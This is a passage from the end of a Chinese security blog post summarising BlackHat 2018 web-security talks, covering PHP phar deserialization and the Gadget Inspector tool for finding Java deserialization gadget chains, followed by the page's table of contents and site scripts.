+<h2 id="0x05-It’s-a-PHP-Unserialization-Vulnerability-Jim-but-Not-as-We-Know-It（不为人知的PHP反序列化漏洞）"><a href="#0x05-It’s-a-PHP-Unserialization-Vulnerability-Jim-but-Not-as-We-Know-It（不为人知的PHP反序列化漏洞）" class="headerlink" title="0x05 It’s a PHP Unserialization Vulnerability Jim, but Not as We Know It（不为人知的PHP反序列化漏洞）"></a>0x05 It’s a PHP Unserialization Vulnerability Jim, but Not as We Know It（不为人知的PHP反序列化漏洞）</h2><p>PDF：</p>
+<p><a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf" target="_blank" rel="noopener">https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf</a></p>
+<p><a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf" target="_blank" rel="noopener">https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf</a></p>
+<h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><p>这个议题没啥好说的，就是phar反序列化漏洞，在<a href="http://www.mi1k7ea.com/2019/01/01/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">《phar反序列化漏洞》</a>中已经分析过了，而且很多CTF题目也出现过了，不再赘述。</p>
+<h2 id="0x06-Automated-Discovery-of-Deserialization-Gadget-Chains（反序列化Gadget链自动发掘）"><a href="#0x06-Automated-Discovery-of-Deserialization-Gadget-Chains（反序列化Gadget链自动发掘）" class="headerlink" title="0x06 Automated Discovery of Deserialization Gadget Chains（反序列化Gadget链自动发掘）"></a>0x06 Automated Discovery of Deserialization Gadget Chains（反序列化Gadget链自动发掘）</h2><p>PDF：</p>
+<p><a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf" target="_blank" rel="noopener">https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf</a></p>
+<p><a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains-wp.pdf" target="_blank" rel="noopener">https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains-wp.pdf</a></p>
+<h3 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h3><p>作者对已有的反序列化漏洞利用工具进行了调研分析，其中ysoserial主要是针对某些特定库以及JDK ObjectInputStream的漏洞利用，但是对于非标准库的场景就没法利用了。作者针对Java提出了一种可自动发现反序列化工具链的技术，并研发了基于Java字节码发掘反序列化Gadget链的工具Gadget Inspector。</p>
+<p>工具地址：<a href="https://github.com/JackOfMostTrades/gadgetinspector" target="_blank" rel="noopener">https://github.com/JackOfMostTrades/gadgetinspector</a></p>
+<p>在研发过程中，作者枚举war包中类、方法的层次关系，发掘了直通数据流和调用图，并在此基础上使用已知的tricks枚举了可能源，最后在数据流的调用图中使用BFS算法发掘Gadget链。在性能表现上，Gadget Inspector支持对最受欢迎的前100个Java库的检测，并且在检测效果中可以发掘一些最新的Gadget链。虽然有少量的误报，但这些误报大多来自反射链。</p>
+<p>该工具后面会深入研究，这里先不浅谈了。</p>
+
+    </div>
+
+  </article>
+  <div class="toc-container">
+    
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-前言"><span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-Edge-Side-Include-Injection-Abusing-Caching-Servers-into-SSRF-and-Transparent-Session-Hijacking（ESI注入：滥用缓存服务器进行SSRF攻击和透明会话劫持）"><span class="toc-text">0x01 Edge Side Include Injection: Abusing Caching Servers into SSRF and Transparent Session Hijacking（ESI注入：滥用缓存服务器进行SSRF攻击和透明会话劫持）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#何为ESI"><span class="toc-text">何为ESI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ESI-Demo"><span class="toc-text">ESI Demo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ESI注入攻击原理"><span class="toc-text">ESI注入攻击原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ESI注入攻击——SSRF"><span class="toc-text">ESI注入攻击——SSRF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ESI注入攻击——绕过XSSFilter"><span class="toc-text">ESI注入攻击——绕过XSSFilter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ESI注入攻击——无JS窃取HttpOnly-Cookie"><span class="toc-text">ESI注入攻击——无JS窃取HttpOnly Cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#各应用支持情况"><span class="toc-text">各应用支持情况</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#检测方法"><span class="toc-text">检测方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Breaking-Parser-Logic-Take-Your-Path-Normalization-off-and-Pop-0days-Out"><span class="toc-text">0x02 Breaking Parser Logic: Take Your Path Normalization off and Pop 0days Out!</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#路径归一化盲区"><span class="toc-text">路径归一化盲区</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#不同OS不一致"><span class="toc-text">不同OS不一致</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#不同编码不一致"><span class="toc-text">不同编码不一致</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#归一化顺序不同"><span class="toc-text">归一化顺序不同</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Q-E"><span class="toc-text">..\Q/\E</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Nginx斜杠绕过"><span class="toc-text">Nginx斜杠绕过</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#深入代码审计现存的应用"><span class="toc-text">深入代码审计现存的应用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Spring-0day-CVE-2018-1271"><span class="toc-text">Spring 0day - CVE-2018-1271</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Rails-0day-CVE-2018-3760"><span class="toc-text">Rails 0day - CVE-2018-3760</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#新的多层架构攻击面"><span class="toc-text">新的多层架构攻击面</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-WebAssembly-A-New-World-of-Native-Exploits-on-the-Browser（WebAssembly：浏览器漏洞的新世界）"><span class="toc-text">0x03 WebAssembly: A New World of Native Exploits on the Browser（WebAssembly：浏览器漏洞的新世界）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#简介"><span class="toc-text">简介</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-Practical-Web-Cache-Poisoning-Redefining-‘Unexploitable’（缓存投毒攻击）"><span class="toc-text">0x04 Practical Web Cache Poisoning: Redefining ‘Unexploitable’（缓存投毒攻击）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Web缓存和投毒"><span class="toc-text">Web缓存和投毒</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#案例分析"><span class="toc-text">案例分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Basic-Poisoning"><span class="toc-text">Basic Poisoning</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Discreet-poisoning"><span class="toc-text">Discreet poisoning</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Selective-Poisoning"><span class="toc-text">Selective Poisoning</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DOM-Poisoning"><span class="toc-text">DOM Poisoning</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#其他更多的案例"><span class="toc-text">其他更多的案例</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-It’s-a-PHP-Unserialization-Vulnerability-Jim-but-Not-as-We-Know-It（不为人知的PHP反序列化漏洞）"><span class="toc-text">0x05 It’s a PHP Unserialization Vulnerability Jim, but Not as We Know It（不为人知的PHP反序列化漏洞）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#简介-1"><span class="toc-text">简介</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-Automated-Discovery-of-Deserialization-Gadget-Chains（反序列化Gadget链自动发掘）"><span class="toc-text">0x06 Automated Discovery of Deserialization Gadget Chains（反序列化Gadget链自动发掘）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#简介-2"><span class="toc-text">简介</span></a></li></ol></li></ol>
+  </div>
+
+
+  </div>
+</div>
+<div class="copyright">
+    <span>本作品采用</span>
+    <a href="https://creativecommons.org/licenses/by/4.0/">知识共享署名 4.0 国际许可协议</a>
+    <span>进行许可。 转载时请注明原文链接。</span>
+</div>
+
+
+  
+    <div class="post-nav">
+      <div class="post-nav-item post-nav-next">
+        
+          <span>〈 </span>
+          <a href="/2020/04/19/BlackHat-2017-Web小结/" rel="next" title="BlackHat 2017 Web小结">
+          BlackHat 2017 Web小结
+          </a>
+        
+      </div>
+  
+      <div class="post-nav-item post-nav-prev">
+          
+          <a href="/2020/04/20/BlackHat-2019-Web小结/" rel="prev" title="BlackHat 2019 Web小结">
+            BlackHat 2019 Web小结
+          </a>
+          <span>〉</span>
+        
+      </div>
+    </div>
+  
+
+
+    </div>
+
+    
+    
+
+  </div>
+  <footer class="footer text-center">
+    <div id="bottom-inner">
+        <span>Copyright &copy; Mi1k7ea</span>  |  
+        <span id="busuanzi_container_site_pv">总访问量 <span id="busuanzi_value_site_pv"></span></span> | 
+        <span id="busuanzi_container_site_uv">访客 <span id="busuanzi_value_site_uv"></span></span>
+    </div>
+</footer>
+
+  
+
+<script>
+  (function(window, document, undefined) {
+
+    var timer = null;
+
+    function returnTop() {
+      cancelAnimationFrame(timer);
+      timer = requestAnimationFrame(function fn() {
+        var oTop = document.body.scrollTop || document.documentElement.scrollTop;
+        if (oTop > 0) {
+          document.body.scrollTop = document.documentElement.scrollTop = oTop - 50;
+          timer = requestAnimationFrame(fn);
+        } else {
+          cancelAnimationFrame(timer);
+        }
+      });
+    }
+
+    var hearts = [];
+    window.requestAnimationFrame = (function() {
+      return window.requestAnimationFrame ||
+        window.webkitRequestAnimationFrame ||
+        window.mozRequestAnimationFrame ||
+        window.oRequestAnimationFrame ||
+        window.msRequestAnimationFrame ||
+        function(callback) {
+          setTimeout(callback, 1000 / 60);
+        }
+    })();
+    init();
+
+    function init() {
+      css(".heart{z-index:9999;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: absolute;}.heart:after{top: -5px;}.heart:before{left: -5px;}");
+      attachEvent();
+      gameloop();
+      addMenuEvent();
+    }
+
+    function gameloop() {
+      for (var i = 0; i < hearts.length; i++) {
+        if (hearts[i].alpha <= 0) {
+          document.body.removeChild(hearts[i].el);
+          hearts.splice(i, 1);
+          continue;
+        }
+        hearts[i].y--;
+        hearts[i].scale += 0.004;
+        hearts[i].alpha -= 0.013;
+        hearts[i].el.style.cssText = "left:" + hearts[i].x + "px;top:" + hearts[i].y + "px;opacity:" + hearts[i].alpha + ";transform:scale(" + hearts[i].scale + "," + hearts[i].scale + ") rotate(45deg);background:" + hearts[i].color;
+      }
+      requestAnimationFrame(gameloop);
+    }
+
+    /**
+     * 给logo设置点击事件
+     * 
+     * - 回到顶部
+     * - 出现爱心
+     */
+    function attachEvent() {
+      var old = typeof window.onclick === "function" && window.onclick;
+      var logo = document.getElementById("logo");
+      if (logo) {
+        logo.onclick = function(event) {
+          returnTop();
+          old && old();
+          createHeart(event);
+        }
+      }
+      
+    }
+
+    function createHeart(event) {
+      var d = document.createElement("div");
+      d.className = "heart";
+      hearts.push({
+        el: d,
+        x: event.clientX - 5,
+        y: event.clientY - 5,
+        scale: 1,
+        alpha: 1,
+        color: randomColor()
+      });
+      document.body.appendChild(d);
+    }
+
+    function css(css) {
+      var style = document.createElement("style");
+      style.type = "text/css";
+      try {
+        style.appendChild(document.createTextNode(css));
+      } catch (ex) {
+        style.styleSheet.cssText = css;
+      }
+      document.getElementsByTagName('head')[0].appendChild(style);
+    }
+
+    function randomColor() {
+      // return "rgb(" + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + ")";
+      return "#F44336";
+    }
+
+    function addMenuEvent() {
+      var menu = document.getElementById('menu-main-post');
+      if (menu) {
+        var toc = document.getElementById('toc');
+        if (toc) {
+          menu.onclick = function() {
+            if (toc) {
+              if (toc.style.display == 'block') {
+                toc.style.display = 'none';
+              } else {
+                toc.style.display = 'block';
+              }
+            }
+          };
+        } else {
+          menu.style.display = 'none';
+        }
+      }
+    }
+
+  })(window, document);
+</script>
+
+  
+
+
+
+  
+<script>
+  (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      }
+      else {
+          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+  })();
+</script>
+
+
+</body>
+</html>
